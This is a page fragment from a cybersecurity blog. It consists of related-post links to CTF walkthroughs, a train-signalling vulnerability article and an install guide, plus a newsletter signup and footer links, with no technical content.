### [Invisible Rails: The Shocking Vulnerabilities of CBTC Trains](https://thecybersecguru.com/analysis/cbtc-vulnerabilities/)

[![](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/02/Mastering-WingData-Beginners-Guide-from-HackTheBox.jpg?resize=150%2C150&ssl=1)](https://thecybersecguru.com/ctf-walkthroughs/mastering-wingdata-beginners-guide-from-hackthebox/)

###### CTF Walkthroughs

### [Beginner’s Guide to Conquering WingData on HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-wingdata-beginners-guide-from-hackthebox/)

[![Mastering Pterodactyl Beginner's Guide from HackTheBox](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/02/Mastering-Pterodactyl-Beginners-Guide-from-HackTheBox.jpg?resize=150%2C150&ssl=1)](https://thecybersecguru.com/ctf-walkthroughs/mastering-pterodactyl-beginners-guide-from-hackthebox/)

###### CTF Walkthroughs

### [Beginner’s Guide to Conquering Pterodactyl on HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-pterodactyl-beginners-guide-from-hackthebox/)

[![How to Install OpenClaw Securely](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/02/How-to-Install-OpenClaw-Securely.jpg?resize=150%2C150&ssl=1)](https://thecybersecguru.com/tutorials/how-to-install-openclaw-moltbot-on-vps/)

###### Tutorials

### [How to Install OpenClaw (Moltbot) Securely: The Ultimate Guide](https://thecybersecguru.com/tutorials/how-to-install-openclaw-moltbot-on-vps/)

## **Newsletter Subscription**

Sign up to get notified of new posts automatically!

Type your email…

Subscribe

© 2026 The CyberSec Guru | All Rights Reserved

[**About**](https://thecybersecguru.com/about-the-cybersec-guru/)[**Coffee**](https://buymeacoffee.com/thecybersecguru)[NEWSLETTER](https://thecybersecguru.com/newsletter-subscription/)[Contact](https://thecybersecguru.com/contact-the-cybersec-guru/)[PRIVACY](https://thecybersecguru.com/privacy-policy/)

[](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#)

![Buy Me A Coffee](https://cdn.buymeacoffee.com/widget/assets/coffee%20cup.svg)